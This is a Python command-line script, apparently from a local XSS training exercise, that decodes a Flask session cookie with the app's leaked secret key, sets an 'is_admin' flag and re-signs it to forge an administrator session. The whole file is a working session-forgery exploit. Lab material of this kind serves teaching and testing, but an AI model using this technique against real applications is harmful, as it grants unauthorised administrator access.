"""Re-sign a session cookie for the repository's local XSS exercise."""

from __future__ import annotations

import argparse
import base64
import binascii
from collections.abc import Sequence

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

IS_ADMIN_KEY = "is_admin"


def decode_logged_secret(encoded_secret: str) -> bytes:
    """Decode the base64 value printed by the supplied local application."""
    try:
        secret = base64.b64decode(encoded_secret, validate=True)
    except (binascii.Error, ValueError) as error:
        raise ValueError("the logged secret must be valid base64") from error
    if not secret:
        raise ValueError("the logged secret must not be empty")
    return secret


def elevate_session_cookie(session_cookie: str, encoded_secret: str) -> str:
    """Return a valid local cookie with the exercise's administrator flag set."""
    application = Flask(__name__)
    application.secret_key = decode_logged_secret(encoded_secret)
    serializer = SecureCookieSessionInterface().get_signing_serializer(application)
    if serializer is None:
        raise RuntimeError("could not construct Flask's session serializer")

    session_data = serializer.loads(session_cookie)
    if not isinstance(session_data, dict):
        raise ValueError("the session cookie did not contain an object")
    session_data[IS_ADMIN_KEY] = True
    return serializer.dumps(session_data)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Re-sign a session cookie for this repository's local exercise."
    )
    parser.add_argument("session_cookie", help="cookie emitted by the local XSSApp")
    parser.add_argument("logged_secret", help="base64 secret printed by the local XSSApp")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    arguments = build_parser().parse_args(argv)
    print(elevate_session_cookie(arguments.session_cookie, arguments.logged_secret))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
